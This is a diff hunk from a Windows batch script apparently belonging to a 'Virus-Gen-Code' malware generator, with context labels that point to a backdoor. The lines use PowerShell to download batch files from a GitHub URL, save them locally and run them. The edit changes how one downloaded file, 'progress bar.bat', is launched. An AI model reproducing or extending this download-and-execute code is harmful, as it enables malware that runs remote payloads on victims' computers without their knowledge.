@@ -53,7 +53,7 @@ if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
 :: create all files needed
   :: create placeholder file
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >"progress bar.bat"
-    start "progress bar.bat"
+    start call "progress bar.bat"
     timeout 1 >nul
     echo data>load_trigger.txt
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
